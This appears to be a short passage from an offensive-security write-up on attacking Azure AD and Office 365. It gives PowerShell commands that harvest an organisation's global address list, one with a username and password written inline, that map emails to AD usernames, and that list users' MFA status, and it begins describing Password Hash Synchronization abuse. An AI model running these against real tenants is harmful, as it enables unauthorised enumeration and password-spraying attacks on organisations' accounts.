# Password Spraying
By connecting to Outlook Web Access Portal and utilizing the FindPeople method, it is able to gather the list of all email addresses:
```
Get-GlobalAddressList -ExchHostname outlook.office365.com -UserName thureinsoe@insomnia.com -Password 123456%*@aA -OutFile global-address-list.txt

```
# Exchange Service
Connecting to Exchange Service, it is also able to retrieve the Active Directory username corresponding to the given email address
```
Get-ADUsernameFromEWS -EmailList gotham-emails.txt -ExchHostname outlook.office365.com -Remote
```
# Enabling Multi-Factor Authentication Users
The following MSOnline PowerShell command allows Azure AD administrators to list Azure AD users and the state of their MFA configuration
```
Get-MsolUser -EnabledFilter EnabledOnly -MaxResults 50000 | select DisplayName,UserPrincipalName,@{N="MFA Status"; E={ if( $_.StrongAuthenticationRequirements.State -ne $null){ $_. StrongAuthenticationRequirements.State} else { "Disabled"}}} | export-csv mfaresults.csv
```
# Password Hash Synchronization (PHS)
This attack is not actually targeting Azure AD but exploiting one of its features in order to escalate privileges on the on-premise Active Directory domain it is synchronized with. Remember Password Hash Synchronization? As explained earlier in this post, a synchronisation account is created by Azure AD Connect on the on-premises Active Directory
